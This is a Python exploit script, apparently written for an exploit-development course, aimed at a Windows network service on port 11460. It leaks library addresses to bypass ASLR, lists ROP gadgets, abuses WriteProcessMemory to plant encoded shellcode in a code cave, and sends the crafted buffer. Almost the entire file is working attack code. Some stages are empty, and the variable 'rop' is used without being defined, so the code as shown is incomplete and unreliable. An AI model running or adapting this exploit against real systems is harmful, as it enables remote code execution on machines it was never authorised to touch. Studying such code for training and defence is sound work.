r"""



"""

import struct
import sys
from struct import pack

from pwn import *


from modules.msfvenom_module import generatePayload
from modules.shellcode_module import generateShellcodeDecoder, getShellcode

from modules.util_module import bad_chars, log, checkBadChars, checkNullBytes, sendMalBuff, parse_args, printBuffer, leakFunctionAddress, repeat_bytes

DEBUG = True
DEBUG_Response = False
BASE_ADDR_BAD = False


def main():
    global BASE_ADDR_BAD
    args = parse_args()
    server = args.ip
    port = 11460

    log(f"IP Addr: {server}:{port}", level="*")

    try:
        functions = [b"N98E_CRYPTO_get_new_lockid" + b"\x00", b"WriteProcessMemory" + b"\x00"]
        leakedAddresses = []

        """
        ************************************************************************************
        ******************************* ASLR Bypass Start***********************************
        ************************************************************************************
        """
        # Leak addresses of functions
        for func in functions:
            # If addr is good i.e. no null bytes, append to list, else exit
            leakedAddress = leakFunctionAddress(func, (server, port))

            if checkNullBytes(pack("<L", leakedAddress)):
                leakedAddresses.append(leakedAddress)
            else:
                log(f"Leaked address for {func.decode('utf-8').strip(chr(0))} contains null bytes {hex(leakedAddress)}", level="-")
                sys.exit(1)

        WPMAddr = leakedAddresses[1]  # WriteProcessMemory address
        exportedFunc = leakedAddresses[0]  # N98E_CRYPTO_get_new_lockid address

        # Target Function Offset observed from loading the dll in IDA was noted
        functionOffset = 0x14E0

        libeay32ibm019 = exportedFunc - functionOffset

        # # If our base address is not favorable, log it and exit
        # BASE_ADDR_BAD = checkBadChars(pack("<L", libeay32ibm019))
        # if BASE_ADDR_BAD:
        #     log(
        #         f"Calculated library base via\n\t\t{functions[0].decode('utf-8')}: {str(hex(libeay32ibm019))} contains bad chars",
        #         level="-",
        #     )
        #     sys.exit(1)

        log(
            f"Calculated library base via\n\t\t{functions[0].decode('utf-8')}: {str(hex(libeay32ibm019))}",
            level="+",
        )

        """
        ************************************************************************************
        ******************************* Stage 0: ROP Gadgets *******************************
        ************************************************************************************
        """
        rop_inc_eax_ret = pack("<L", (libeay32ibm019 + 0x00088C67))  # inc eax; ret [!] Changed
        rop_neg_eax_ret = pack("<L", (libeay32ibm019 + 0x0001D8C2))  # neg eax ; ret [!!!] Verified
        rop_pop_eax_ret = pack("<L", (libeay32ibm019 + 0x0007DBD2))  # pop eax; ret [!] Changed
        rop_pop_ecx_ret = pack("<L", (libeay32ibm019 + 0x00088D9E))  # pop ecx; ret [!] Changed
        rop_add_eax_ecx_ret = pack("<L", (libeay32ibm019 + 0x0001D0F0))  # add eax, ecx; ret [!!!] Verified
        rop_xchg_eax_esp_ret = pack("<L", (libeay32ibm019 + 0x0003A003))  # xchg eax, esp ; ret [!!!] Verified
        rop_mov_ptrEAX_ecx_ret = pack("<L", (libeay32ibm019 + +0x0006C574))  # mov dword [eax], ecx ; ret [!] Changed
        rop_add_ptrEAX_1_bh_ret = pack("<L", (libeay32ibm019 + 0x000762BC))  # add byte [eax+0x00000001], bh ; ret [!] Changed
        rop_push_eax_pop_esi_ret = pack("<L", (libeay32ibm019 + 0x000408DD))  # push eax; pop esi; ret [!!!] Verified
        rop_push_esp_pop_esi_ret = pack("<L", (libeay32ibm019 + 0x000408D6))  # push esp; pop esi; ret <- Save ESP to ESI [!!!] Verified
        rop_sub_eax_ecx_pop_ebx_ret = pack("<L", (libeay32ibm019 + 0x00064E64))  # sub eax, ecx; pop ebx; ret [!] Changed
        rop_mov_eax_esi_pop_esi_ret = pack("<L", (libeay32ibm019 + 0x0008822E))  # mov eax, esi; pop esi; ret  | Save ESP to EAX+ESI [!] Changed
        rop_int3_int3_int3_int3_ret = pack("<L", (libeay32ibm019 + 0x00087E3C))  #  int3; int3; int3; int3; ret; <- debugging [o] Corrected
        rop_mov_ecx_eax_mov_eax_esi_pop_esi_ret_0x10 = pack(
            "<L", (libeay32ibm019 + 0x0008876D)
        )  # mov ecx, eax ; mov eax, esi ; pop esi ; retn 0x0010 [!!!] Verified
        """
        ************************************************************************************
        ************************************ Abuse WPM *************************************
        ************************************************************************************
        """
        # Init Buffer
        buf = bytearray()

        # psAgentCommand
        buf += bytearray([0x41] * 0xC)
        buf += pack("<i", 0x534)  # opcode
        buf += pack("<i", 0x0)  # 1st memcpy: offset
        buf += pack("<i", 0x1100)  # 1st memcpy: size field
        buf += pack("<i", 0x0)  # 2nd memcpy: offset
        buf += pack("<i", 0x100)  # 2nd memcpy: size field
        buf += pack("<i", 0x0)  # 3rd memcpy: offset
        buf += pack("<i", 0x100)  # 3rd memcpy: size field
        buf += bytearray([0x41] * 0x8)

        # psCommandBuffer
        # NOTE:: My code cave is larger than the book's 0x400
        #        which is why the offset is lower than 0x92c04
        #        (0x880B0)
        codeCaveOffset = 0x92C04
        wpm = pack("<L", (WPMAddr))  # WriteProcessMemory Address
        wpm += pack("<L", (libeay32ibm019 + codeCaveOffset))  # Shellcode Return Address
        wpm += pack("<L", (0xFFFFFFFF))  # pseudo Process handle
        wpm += pack("<L", (libeay32ibm019 + codeCaveOffset))  # Code cave address
        wpm += pack("<L", (0x41414141))  # dummy lpBuffer (Stack address)
        wpm += pack("<L", (0x42424242))  # dummy nSize
        wpm += pack("<L", (libeay32ibm019 + 0xE401C))  # lpNumberOfBytesWritten = libBase + offset of writable DWORD in .data
        wpm += repeat_bytes("WRITEPROCESS.END", 0x10)

        offsetLen = 276 - len(wpm)  # FIXED <- Was 274
        offset = repeat_bytes("OFFSET.TO.R_EIP", offsetLen)

        eip = rop_push_esp_pop_esi_ret  # <- Save ESP to ESI
        log(f"DEBUG: sent_eip: 0x{struct.unpack('<L', eip)[0]:08x}", level="!!!")

        if checkBadChars(eip):
            log(f"eip: 0x{struct.unpack('<L', eip)[0]:08x} contains bad chars", level="-", indent=2)
            sys.exit(1)

        if not checkNullBytes(eip):
            log(f"eip: 0x{struct.unpack('<L', eip)[0]:08x} contains null bytes", level="-", indent=2)
            sys.exit(1)
        # eip += rop_int3_int3_int3_int3_ret  # <- Debugging

        """
        ************************************************************************************
        ***************************** Stage 1a: Patch lpBuffer *****************************
        ************************************************************************************
        """


        """
        ************************************************************************************
        ********************** Stage 1b: Patch lpNumberOfBytesWritten **********************
        ************************************************************************************
        """

        """ 
        ************************************************************************************
        ****************************** Stage 1c: Patch nSize *******************************
        ************************************************************************************
        """

        """
        ************************************************************************************
        *************************** Stage 1d: Shellcode Decoding ***************************
        ************************************************************************************
        """
        # Align EAX with shellcode
        # rop += rop_int3_int3_int3_int3_ret  # int3; int3; int3; int3; ret
        rop += rop_pop_ecx_ret  # pop ecx ; ret
        rop += pack("<L", (0xFFFFF9E5))  # negative offset -1
        rop += rop_sub_eax_ecx_pop_ebx_ret  # sub eax, ecx; pop ebx; ret
        rop += pack("<L", (0x42424242))  # JUNK into EBX
        # rop += rop_add_ptrEAX_1_bh_ret  # add [eax+1], bh; ret

        # We're encoding/generating shellcdde here but the decoder is placed later in the rop chain, so we need to generate the shellcode first
        # Get encoded shellcode, moving forward we will be using the encoded shellcode
        encoded_shellcode, replacements = getShellcode(encoded=True, bad_chars=bad_chars)

        # Generate the shellcode decoder and add it to the rop chain
        rop += rop_int3_int3_int3_int3_ret  # int3; int3; int3; int3; ret
        rop += generateShellcodeDecoder(
            replacements=replacements,
            rop_pop_ecx=rop_pop_ecx_ret,
            rop_sub_eax_ecx_pop_ebx=rop_sub_eax_ecx_pop_ebx_ret,
            rop_add_ptrEAX_1_bh=rop_add_ptrEAX_1_bh_ret,
            debug=True,
        )
        rop += rop_int3_int3_int3_int3_ret  # int3; int3; int3; int3; ret

        """
        ************************************************************************************
        ******************************** Stage 1e: Align ESP *******************************
        ************************************************************************************
        """
        # 18032026_1057:
        # Align ESP with ROP Skeleton
        # EAX points 0x14 bytes ahead of WPM on stack
        # This will jump EIP back straight up towards the WPM address call
        rop += rop_pop_ecx_ret  # pop ecx ; ret
        rop += pack("<L", (0xFFFFFFEC))  # -0x14
        rop += rop_add_eax_ecx_ret  # add eax, ecx ; ret
        rop += rop_xchg_eax_esp_ret  # xchg eax, esp ; ret

        """
        ************************************************************************************
        *********************** Stage 2: Shellcode loading (ENCODED) ***********************
        ************************************************************************************
        """
        # 0257_03242026:
        # Start of 11.4.2
        # alr know meterpreter shellcode wont run here, just reading through all this
        # REASON:: mfsvenom uses a Encoder/Decoder to avoid badchars. This requires the use of writeable memory
        #          which is not available in this case as WPM restores the default protections which were read/exec
        offset2Len = 0x600 - len(rop)
        offset2 = repeat_bytes("OFFSET.SHELLCODE", offset2Len)  # This was calculated by subtracting lpBuffer address to the end of our ROP chain
        # shellcode = getShellcode(encoded=True)[:20]  # Get encoded shellcode, moving forward we will be using the encoded shellcode
        shellcode = rop_int3_int3_int3_int3_ret
        shellcode += encoded_shellcode
        log("Encoded Shellcode", level="+")
        printBuffer(shellcode, width="dd")

        # SHELLCODE ENCODING:
        # The ropchain to decode the shellcode is to be placed before the ESP alignment section

        # Padding (Followed the vid)
        # padding = b"D" * (0x1000 - 276 - 4 - len(rop) - len(offset2) - len(shellcode))
        # TEST CODE
        padding_len = 0x1000 - 276 - 4 - len(rop) - len(offset2) - len(shellcode)
        padding = repeat_bytes("DEADC0DE.PADDING", padding_len)

        # Prepare buffer + add checksum
        buffer = offset + wpm + eip + rop + offset2 + shellcode + padding
        buf += b"File: %s From: %d To: %d ChunkLoc: %d FileLoc: %d" % (buffer, 0, 0, 0, 0)
        buf = pack(">i", len(buf) - 4) + buf  # Checksum DWORD        0x00 - 0x04

        # Send Final Buffer
        log("Sending final buffer...", level="*")
        sendMalBuff(buf, (server, port), DEBUG_Response=True)

    except KeyboardInterrupt:
        log("User requested shutdown", level="-")
        return 1


if __name__ == "__main__":
    sys.exit(main())
